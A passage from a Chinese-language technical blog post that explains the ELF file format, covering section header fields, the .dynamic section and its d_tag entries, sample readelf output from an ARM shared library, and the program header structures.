offset)**：</p>\n<ul>\n<li>类型：<code>Elf64_Off</code>（64位无符号整数）</li>\n<li>解释：段在文件中的偏移量，指明该段数据从文件的哪个位置开始。</li>\n</ul>\n</li>\n<li><p>**<code>sh_size</code> (Size of section in bytes)**：</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：段的大小，以字节为单位。</li>\n</ul>\n</li>\n<li><p>**<code>sh_link</code> (Index of another section)**：</p>\n<ul>\n<li>类型：<code>Elf64_Word</code>（32位无符号整数）</li>\n<li>解释：此字段与段的类型相关。对于符号表，它通常是关联字符串表的索引；对于重定位段，它可能是关联符号表的索引。</li>\n</ul>\n</li>\n<li><p>**<code>sh_info</code> (Additional section information)**：</p>\n<ul>\n<li>类型：<code>Elf64_Word</code>（32位无符号整数）</li>\n<li>解释：该字段也与段类型相关。例如，对于符号表，它表示局部符号的起始索引；对于重定位段，它可能是相关节的索引。</li>\n</ul>\n</li>\n<li><p>**<code>sh_addralign</code> (Section alignment)**：</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：段的对齐要求。段必须按此对齐方式在内存中对齐。如果对齐值为 0 或 1，则表示没有特殊对齐要求。</li>\n</ul>\n</li>\n<li><p>**<code>sh_entsize</code> (Entry size if section holds table)**：</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：如果段包含一个表（如符号表或重定位表），此字段指明每个表项的大小。如果段不是表，则此字段为 0。</li>\n</ul>\n</li>\n</ol>\n<p>这些字段共同描述了每个段的基本属性，使操作系统或链接器能够正确处理 ELF 文件中的各个段。</p>\n<p>连接器相关的 .dynamic section</p>\n<p><strong><code>.dynamic</code> 段</strong> 在 ELF 文件中是一个非常重要的段，它用于描述可执行文件或共享对象文件在运行时与动态链接器之间的互动。它包含了与动态链接相关的各种信息，比如所依赖的共享库、全局偏移表（GOT）、符号表、重定位表等。</p>\n<p><code>.dynamic</code> 段的内容是由一系列 <code>Elf64_Dyn</code> 结构体组成的。每个 <code>Elf64_Dyn</code> 结构体有两个成员，分别是 <code>d_tag</code> 和 <code>d_un</code>，其中 <code>d_tag</code> 指定了动态条目的类型，而 <code>d_un</code> 则包含相应的值或地址。</p>\n<p><code>Elf64_Dyn</code> 结构体的定义如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    Elf64_Sxword d_tag;     <span class=\"comment\">/* Dynamic entry type */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">        Elf64_Xword d_val;  <span class=\"comment\">/* Integer value */</span></span><br><span class=\"line\">        Elf64_Addr d_ptr;   <span class=\"comment\">/* Program virtual address */</span></span><br><span class=\"line\">    &#125; d_un;</span><br><span class=\"line\">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"详细介绍-dynamic-段的常用标志（d-tag-字段）\"><a href=\"#详细介绍-dynamic-段的常用标志（d-tag-字段）\" class=\"headerlink\" title=\"详细介绍 .dynamic 段的常用标志（d_tag 字段）\"></a>详细介绍 <code>.dynamic</code> 段的常用标志（<code>d_tag</code> 字段）</h3><p>每个动态条目（entry）的 <code>d_tag</code> 字段表示该条目的类型，<code>d_un</code> 存储的值可能是一个整数（<code>d_val</code>）或者是一个虚拟地址（<code>d_ptr</code>）。以下是 <code>.dynamic</code> 段中常用的标志及其含义：</p>\n<ol>\n<li><p><strong><code>DT_NEEDED</code></strong></p>\n<ul>\n<li>解释：指向依赖的共享库名称的字符串表索引。每个 <code>DT_NEEDED</code> 条目指定了一个程序运行时所需的共享库。</li>\n<li>类型：<code>d_un.d_val</code> 指向字符串表中的索引。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_PLTRELSZ</code></strong></p>\n<ul>\n<li>解释：<code>.rel.plt</code> 或 <code>.rela.plt</code> 段的大小，即重定位表的大小，主要用于跳转表（PLT）。</li>\n<li>类型：<code>d_un.d_val</code> 是段的大小（以字节为单位）。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_PLTGOT</code></strong></p>\n<ul>\n<li>解释：全局偏移表（Global Offset Table, GOT）的地址。GOT 是用于处理动态符号解析的一个数据结构。</li>\n<li>类型：<code>d_un.d_ptr</code> 是 GOT 段的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_HASH</code></strong></p>\n<ul>\n<li>解释：指向符号哈希表的地址。用于符号查找加速。</li>\n<li>类型：<code>d_un.d_ptr</code> 是哈希表的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_STRTAB</code></strong></p>\n<ul>\n<li>解释：指向字符串表的地址。字符串表保存符号名、库名等。</li>\n<li>类型：<code>d_un.d_ptr</code> 是字符串表的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_SYMTAB</code></strong></p>\n<ul>\n<li>解释：指向符号表的地址。符号表保存了符号（如函数、变量）的地址和类型信息。</li>\n<li>类型：<code>d_un.d_ptr</code> 是符号表的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_RELA</code></strong></p>\n<ul>\n<li>解释：指向带加法重定位表（<code>.rela</code> 段）的地址。</li>\n<li>类型：<code>d_un.d_ptr</code> 是 <code>.rela</code> 重定位表的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_RELASZ</code></strong></p>\n<ul>\n<li>解释：<code>.rela</code> 段的大小（以字节为单位）。</li>\n<li>类型：<code>d_un.d_val</code> 是段的大小。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_STRSZ</code></strong></p>\n<ul>\n<li>解释：字符串表的大小（以字节为单位）。</li>\n<li>类型：<code>d_un.d_val</code> 是字符串表的大小。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_SYMENT</code></strong></p>\n<ul>\n<li>解释：符号表中每个条目的大小（以字节为单位）。</li>\n<li>类型：<code>d_un.d_val</code> 是符号表条目的大小。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_INIT</code></strong></p>\n<ul>\n<li>解释：程序或共享库初始化函数的地址。当程序启动或共享库被加载时，该函数会被调用。</li>\n<li>类型：<code>d_un.d_ptr</code> 是初始化函数的地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_FINI</code></strong></p>\n<ul>\n<li>解释：程序或共享库的终止函数的地址。当程序退出或共享库被卸载时，该函数会被调用。</li>\n<li>类型：<code>d_un.d_ptr</code> 是终止函数的地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_REL</code></strong></p>\n<ul>\n<li>解释：指向不带加法重定位表（<code>.rel</code> 段）的地址。</li>\n<li>类型：<code>d_un.d_ptr</code> 是 <code>.rel</code> 段的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_RELSZ</code></strong></p>\n<ul>\n<li>解释：<code>.rel</code> 段的大小（以字节为单位）。</li>\n<li>类型：<code>d_un.d_val</code> 是 <code>.rel</code> 段的大小。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_JMPREL</code></strong></p>\n<ul>\n<li>解释：指向 <code>.rel.plt</code> 或 <code>.rela.plt</code> 段中的跳转表的重定位条目的地址。</li>\n<li>类型：<code>d_un.d_ptr</code> 是 <code>.rel.plt</code> 或 <code>.rela.plt</code> 段的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_BIND_NOW</code></strong></p>\n<ul>\n<li>解释：指示动态链接器立即解析所有符号，而不是按需解析。这通常用于提高运行时性能。</li>\n<li>类型：此标志仅用作指示（无关联值）。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_DEBUG</code></strong></p>\n<ul>\n<li>解释：用于调试信息，动态链接器可以将一些调试相关信息放入此字段。</li>\n<li>类型：<code>d_un.d_ptr</code> 是指向调试信息结构的虚拟地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_FLAGS</code></strong></p>\n<ul>\n<li>解释：用于表示一些与动态链接相关的标志。常见标志包括：<ul>\n<li><code>DF_ORIGIN</code>：允许使用 <code>$ORIGIN</code> 来解析动态库路径。</li>\n<li><code>DF_SYMBOLIC</code>：优先使用定义在可执行文件中的符号，而非动态库中的符号。</li>\n<li><code>DF_TEXTREL</code>：允许对只读段进行重定位（通常意味着不安全的代码）。</li>\n<li><code>DF_BIND_NOW</code>：所有符号都应立即绑定，而不是延迟到运行时。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong><code>DT_RUNPATH</code></strong></p>\n<ul>\n<li>解释：运行时库搜索路径的地址。它提供了一个库搜索路径，动态链接器将在这个路径中查找所需的共享库。</li>\n<li>类型：<code>d_un.d_ptr</code> 是运行时路径字符串的地址。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_SONAME</code></strong></p>\n<ul>\n<li>解释：共享库的名字。动态链接器会使用这个名字来查找库文件。</li>\n<li>类型：<code>d_un.d_val</code> 是字符串表中的索引，指向共享库名。</li>\n</ul>\n</li>\n<li><p><strong><code>DT_RPATH</code></strong></p>\n<ul>\n<li>解释：指定库搜索路径，类似于 <code>DT_RUNPATH</code>，但优先级不同。<code>RPATH</code> 通常在老版本中使用，<code>RUNPATH</code> 更现代。</li>\n<li>类型：<code>d_un.d_ptr</code> 是运行时库路径字符串的地址。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p><code>.dynamic</code> 段是 ELF 文件中用于动态链接的核心结构，它包含了动态链接器在加载时所需的各种信息。每个 <code>d_tag</code> 对应不同类型的动态条目，链接器通过这些条目来处理库依赖、符号解析、重定位等工作。</p>\n<figure class=\"highlight r\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">There are <span class=\"number\">27</span> section headers<span class=\"punctuation\">,</span> starting at offset <span class=\"number\">0x325c</span><span class=\"operator\">:</span></span><br><span class=\"line\"></span><br><span class=\"line\">Section Headers<span class=\"operator\">:</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span>Nr<span class=\"punctuation\">]</span> Name              Type            Addr     Off    Size   ES Flg Lk <span class=\"literal\">Inf</span> Al</span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">0</span><span class=\"punctuation\">]</span>                   <span class=\"literal\">NULL</span>            <span class=\"number\">00000000</span> <span class=\"number\">000000</span> <span class=\"number\">000000</span> <span class=\"number\">00</span>      <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">1</span><span class=\"punctuation\">]</span> .note.androi<span class=\"punctuation\">[</span>...<span class=\"punctuation\">]</span> NOTE            <span class=\"number\">00000134</span> <span class=\"number\">000134</span> <span class=\"number\">000098</span> <span class=\"number\">00</span>   A  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">2</span><span class=\"punctuation\">]</span> .note.gnu.bu<span class=\"punctuation\">[</span>...<span class=\"punctuation\">]</span> NOTE            <span class=\"number\">000001</span>cc <span class=\"number\">0001</span>cc <span class=\"number\">000024</span> <span class=\"number\">00</span>   A  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">3</span><span class=\"punctuation\">]</span> .dynsym           DYNSYM          <span class=\"number\">000001</span>f0 <span class=\"number\">0001</span>f0 <span class=\"number\">0001</span>c0 <span class=\"number\">10</span>   A  <span class=\"number\">4</span>   <span class=\"number\">1</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">4</span><span class=\"punctuation\">]</span> .dynstr           STRTAB          <span class=\"number\">000003</span>b0 <span class=\"number\">0003</span>b0 <span class=\"number\">00018</span>e <span class=\"number\">00</span>   A  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">5</span><span class=\"punctuation\">]</span> .gnu.hash         GNU_HASH        <span class=\"number\">00000540</span> <span class=\"number\">000540</span> <span class=\"number\">000060</span> <span class=\"number\">04</span>   A  <span class=\"number\">3</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">6</span><span class=\"punctuation\">]</span> .hash             HASH            <span class=\"number\">000005</span>a0 <span class=\"number\">0005</span>a0 <span class=\"number\">0000</span>bc <span class=\"number\">04</span>   A  <span class=\"number\">3</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">7</span><span class=\"punctuation\">]</span> .gnu.version      VERSYM          <span class=\"number\">0000065</span><span class=\"built_in\">c</span> <span class=\"number\">00065</span><span class=\"built_in\">c</span> <span class=\"number\">000038</span> <span class=\"number\">02</span>   A  <span class=\"number\">3</span>   <span class=\"number\">0</span>  <span class=\"number\">2</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">8</span><span class=\"punctuation\">]</span> .gnu.version_d    VERDEF          <span class=\"number\">00000694</span> <span class=\"number\">000694</span> <span class=\"number\">00001</span><span class=\"built_in\">c</span> <span class=\"number\">00</span>   A  <span class=\"number\">4</span>   <span class=\"number\">1</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span> <span class=\"number\">9</span><span class=\"punctuation\">]</span> .gnu.version_r    VERNEED         <span class=\"number\">000006</span>b0 <span class=\"number\">0006</span>b0 <span class=\"number\">000040</span> <span class=\"number\">00</span>   A  <span class=\"number\">4</span>   <span class=\"number\">2</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">10</span><span class=\"punctuation\">]</span> .rel.dyn          REL             <span class=\"number\">000006</span>f0 <span class=\"number\">0006</span>f0 <span class=\"number\">000178</span> <span class=\"number\">08</span>   A  <span class=\"number\">3</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">11</span><span class=\"punctuation\">]</span> .rel.plt          REL             <span class=\"number\">00000868</span> <span class=\"number\">000868</span> <span class=\"number\">000080</span> <span class=\"number\">08</span>  AI  <span class=\"number\">3</span>  <span class=\"number\">20</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">12</span><span class=\"punctuation\">]</span> .plt              PROGBITS        <span class=\"number\">000008e8</span> <span class=\"number\">0008e8</span> <span class=\"number\">0000</span>d4 <span class=\"number\">00</span>  AX  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">13</span><span class=\"punctuation\">]</span> .text             PROGBITS        <span class=\"number\">000009</span>bc <span class=\"number\">0009</span>bc <span class=\"number\">001750</span> <span class=\"number\">00</span>  AX  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">14</span><span class=\"punctuation\">]</span> .ARM.exidx        ARM_EXIDX       <span class=\"number\">0000210</span><span class=\"built_in\">c</span> <span class=\"number\">00210</span><span class=\"built_in\">c</span> <span class=\"number\">0001</span>a8 <span class=\"number\">08</span>  AL <span class=\"number\">13</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">15</span><span class=\"punctuation\">]</span> .ARM.extab        PROGBITS        <span class=\"number\">000022</span>b4 <span class=\"number\">0022</span>b4 <span class=\"number\">000198</span> <span class=\"number\">00</span>   A  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">16</span><span class=\"punctuation\">]</span> .rodata           PROGBITS        <span class=\"number\">0000244</span><span class=\"built_in\">c</span> <span class=\"number\">00244</span><span class=\"built_in\">c</span> <span class=\"number\">0005</span>fc <span class=\"number\">01</span> AMS  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">17</span><span class=\"punctuation\">]</span> .data.rel.ro      PROGBITS        <span class=\"number\">00003e28</span> <span class=\"number\">002e28</span> <span class=\"number\">00004</span><span class=\"built_in\">c</span> <span class=\"number\">00</span>  WA  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">18</span><span class=\"punctuation\">]</span> .fini_array       FINI_ARRAY      <span class=\"number\">00003e74</span> <span class=\"number\">002e74</span> <span class=\"number\">000008</span> <span class=\"number\">04</span>  WA  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">19</span><span class=\"punctuation\">]</span> .dynamic          DYNAMIC         <span class=\"number\">00003e7</span><span class=\"built_in\">c</span> <span class=\"number\">002e7</span><span class=\"built_in\">c</span> <span class=\"number\">000110</span> <span class=\"number\">08</span>  WA  <span class=\"number\">4</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">20</span><span class=\"punctuation\">]</span> .got              PROGBITS        <span class=\"number\">00003</span>f8c <span class=\"number\">002</span>f8c <span class=\"number\">000074</span> <span class=\"number\">00</span>  WA  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">21</span><span class=\"punctuation\">]</span> .data             PROGBITS        <span class=\"number\">00004000</span> <span class=\"number\">003000</span> <span class=\"number\">000048</span> <span class=\"number\">00</span>  WA  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">22</span><span class=\"punctuation\">]</span> .bss              NOBITS          <span class=\"number\">00004048</span> <span class=\"number\">003048</span> <span class=\"number\">000001</span> <span class=\"number\">00</span>  WA  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">23</span><span class=\"punctuation\">]</span> .comment          PROGBITS        <span class=\"number\">00000000</span> <span class=\"number\">003048</span> <span class=\"number\">0000</span>b6 <span class=\"number\">01</span>  MS  <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">24</span><span class=\"punctuation\">]</span> .note.gnu.go<span class=\"punctuation\">[</span>...<span class=\"punctuation\">]</span> NOTE            <span class=\"number\">00000000</span> <span class=\"number\">003100</span> <span class=\"number\">00001</span><span class=\"built_in\">c</span> <span class=\"number\">00</span>      <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">4</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">25</span><span class=\"punctuation\">]</span> .ARM.attributes   ARM_ATTRIBUTES  <span class=\"number\">00000000</span> <span class=\"number\">00311</span><span class=\"built_in\">c</span> <span class=\"number\">00002</span>e <span class=\"number\">00</span>      <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"punctuation\">[</span><span class=\"number\">26</span><span class=\"punctuation\">]</span> .shstrtab         STRTAB          <span class=\"number\">00000000</span> <span class=\"number\">00314</span>a <span class=\"number\">00010</span>f <span class=\"number\">00</span>      <span class=\"number\">0</span>   <span class=\"number\">0</span>  <span class=\"number\">1</span></span><br><span class=\"line\">Key to Flags<span class=\"operator\">:</span></span><br><span class=\"line\">  W <span class=\"punctuation\">(</span>write<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> A <span class=\"punctuation\">(</span>alloc<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> X <span class=\"punctuation\">(</span>execute<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> M <span class=\"punctuation\">(</span>merge<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> S <span class=\"punctuation\">(</span>strings<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> I <span class=\"punctuation\">(</span>info<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  L <span class=\"punctuation\">(</span>link order<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> O <span class=\"punctuation\">(</span>extra OS processing required<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> G <span class=\"punctuation\">(</span>group<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> <span class=\"built_in\">T</span> <span class=\"punctuation\">(</span>TLS<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  C <span class=\"punctuation\">(</span>compressed<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> x <span class=\"punctuation\">(</span>unknown<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> o <span class=\"punctuation\">(</span>OS specific<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> E <span class=\"punctuation\">(</span>exclude<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  D <span class=\"punctuation\">(</span>mbind<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> y <span class=\"punctuation\">(</span>purecode<span class=\"punctuation\">)</span><span class=\"punctuation\">,</span> p <span class=\"punctuation\">(</span>processor specific<span class=\"punctuation\">)</span></span><br></pre></td></tr></table></figure>\n<p>各个节的解释：<br><a href=\"https://naotu.baidu.com/file/953beb87c9258f4111f4c105ed03c36e\">https://naotu.baidu.com/file/953beb87c9258f4111f4c105ed03c36e</a></p>\n<p>运行视图：<br>PHT<br>program header table<br>其存在，使得操作系统加载程序时尽可能少的产生内存碎片，尽可能的提高内存使用率。</p>\n<p><img src=\"../pic/pht.png\" alt=\"alt text\"></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* These constants define the permissions on sections in the program</span></span><br><span class=\"line\"><span class=\"comment\">   header, p_flags. */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PF_R\t\t0x4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PF_W\t\t0x2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PF_X\t\t0x1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">elf32_phdr</span> &#123;</span><br><span class=\"line\">  Elf32_Word\tp_type;</span><br><span class=\"line\">  Elf32_Off\tp_offset;</span><br><span class=\"line\">  Elf32_Addr\tp_vaddr;</span><br><span class=\"line\">  Elf32_Addr\tp_paddr;</span><br><span class=\"line\">  Elf32_Word\tp_filesz;</span><br><span class=\"line\">  Elf32_Word\tp_memsz;</span><br><span class=\"line\">  Elf32_Word\tp_flags;</span><br><span class=\"line\">  Elf32_Word\tp_align;</span><br><span class=\"line\">&#125; Elf32_Phdr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">elf64_phdr</span> &#123;</span><br><span class=\"line\">  Elf64_Word p_type;</span><br><span class=\"line\">  Elf64_Word p_flags;</span><br><span class=\"line\">  Elf64_Off p_offset;\t\t<span class=\"comment\">/* Segment file offset */</span></span><br><span class=\"line\">  Elf64_Addr p_vaddr;\t\t<span class=\"comment\">/* Segment virtual address */</span></span><br><span class=\"line\">  Elf64_Addr p_paddr;\t\t<span class=\"comment\">/* Segment physical address */</span></span><br><span class=\"line\">  Elf64_Xword p_filesz;\t\t<span class=\"comment\">/* Segment size in file */</span></span><br><span class=\"line\">  Elf64_Xword p_memsz;\t\t<span class=\"comment\">/* Segment size in memory */</span></span><br><span class=\"line\">  Elf64_Xword p_align;\t\t<span class=\"comment\">/* Segment alignment, file &amp; memory */</span></span><br><span class=\"line\">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure>\n<p>在 ELF 文件中，<code>phdr</code> 是 <strong>Program Header</strong>（程序头表）的缩写，描述了可执行文件或共享对象文件的段（segment）信息。与段头表（Section Header）不同，程序头表用于加载时描述如何在内存中布置文件的各个段。</p>\n<p>让我们逐一解释 <code>Elf64_Phdr</code> 结构体中的各个字段：</p>\n<ol>\n<li><p><strong><code>p_type</code></strong> (Segment type):</p>\n<ul>\n<li>类型：<code>Elf64_Word</code>（32位无符号整数）</li>\n<li>解释：指明该段的类型，常见的值包括：<ul>\n<li><code>PT_NULL</code>：未使用的段</li>\n<li><code>PT_LOAD</code>：可加载段</li>\n<li><code>PT_DYNAMIC</code>：动态链接信息段</li>\n<li><code>PT_INTERP</code>：包含解释器路径的段</li>\n<li><code>PT_NOTE</code>：包含注释的段</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong><code>p_flags</code></strong> (Segment flags):</p>\n<ul>\n<li>类型：<code>Elf64_Word</code>（32位无符号整数）</li>\n<li>解释：段的权限标志，可能的标志包括：<ul>\n<li><code>PF_R</code>：可读段</li>\n<li><code>PF_W</code>：可写段</li>\n<li><code>PF_X</code>：可执行段<br>这些标志决定了段在内存中的访问权限。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong><code>p_offset</code></strong> (Segment file offset):</p>\n<ul>\n<li>类型：<code>Elf64_Off</code>（64位无符号整数）</li>\n<li>解释：该段在文件中的偏移量，指明该段数据从文件的哪个位置开始。</li>\n</ul>\n</li>\n<li><p><strong><code>p_vaddr</code></strong> (Segment virtual address):</p>\n<ul>\n<li>类型：<code>Elf64_Addr</code>（64位无符号整数）</li>\n<li>解释：段在内存中的虚拟地址。在加载时，系统会将该段加载到进程的这个虚拟地址处。</li>\n</ul>\n</li>\n<li><p><strong><code>p_paddr</code></strong> (Segment physical address):</p>\n<ul>\n<li>类型：<code>Elf64_Addr</code>（64位无符号整数）</li>\n<li>解释：段的物理地址，主要用于与硬件相关的系统中。在大多数操作系统中，这个值通常与 <code>p_vaddr</code> 相同或者不使用。</li>\n</ul>\n</li>\n<li><p><strong><code>p_filesz</code></strong> (Segment size in file):</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：段在文件中的大小，以字节为单位。</li>\n</ul>\n</li>\n<li><p><strong><code>p_memsz</code></strong> (Segment size in memory):</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：段在内存中的大小，以字节为单位。<code>p_memsz</code> 可以比 <code>p_filesz</code> 大，这种情况通常发生在 BSS 段（未初始化的数据段），在内存中需要占用更多空间，但在文件中不占用空间。</li>\n</ul>\n</li>\n<li><p><strong><code>p_align</code></strong> (Segment alignment):</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：该段在文件和内存中的对齐要求。值为 0 或 1 表示不需要特殊对齐；否则，它必须是 2 的幂，段的文件偏移和内存地址必须符合该对齐要求。</li>\n</ul>\n</li>\n</ol>\n<p>这些字段共同描述了每个程序段的基本属性，帮助系统在执行时正确加载并映射 ELF 文件的各个段。<br>readelf -l file.so</p>\n<figure class=\"highlight cpp\"><table><tr><td 